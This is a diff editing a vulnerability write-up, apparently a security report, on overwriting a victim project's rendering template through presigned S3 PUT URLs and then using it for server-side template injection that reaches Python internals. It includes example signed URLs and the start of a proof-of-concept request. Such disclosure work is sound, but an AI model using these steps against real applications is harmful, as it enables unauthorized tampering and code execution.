@@ -122,6 +122,11 @@ Connection: keep-alive
 
 Observe that the server responded with a PUT URL that we can now use to modify the rendering template asset (**projects/{VICTIM_PROJECT_ID}/render/layout.html**). Make sure to take note of the value of the `put_url` parameter in the response.
 
+```http
+/nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T063241Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=e17693bef57d431c0d36bfcdaa1ae3d978f9dbfba0d05dc09dd13856e97c4415
+```
+
+
 - To modify the rendering template asset, send the following **PUT request**, inserting the PUT URL parameters noted within the previous step.
 
 ```http
@@ -169,7 +174,9 @@ As a result, the attacker can access `self.__init__.__globals__.sys.modules['__m
 
 ### Proof of Concept
 
-- Using the unauthorized rendering template modification vulnerability from the previous step, we can confirm that the web application is vulnerable to SSTI, by sending the following request. Make sure to replace the PUT URL request with the generated URL from the previous finding. In our case, I have used the generated value within my session.
+- Using the unauthorized rendering template modification vulnerability from the previous step, we can confirm that the web application is vulnerable to SSTI, by sending the following request.
+
+*NOTE: Make sure to replace the PUT URL request with the generated URL from the previous finding. In our case, I have used the generated value within my session.*
 
 ```http
 PUT /nl-assets/projects/{target_workspace_uuid}/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T040115Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=3cc5e2d6c0c930e1f33bda5e42f5e0c5f3ad8c0b9213e9e5fccd63694f4272e1 HTTP/1.1
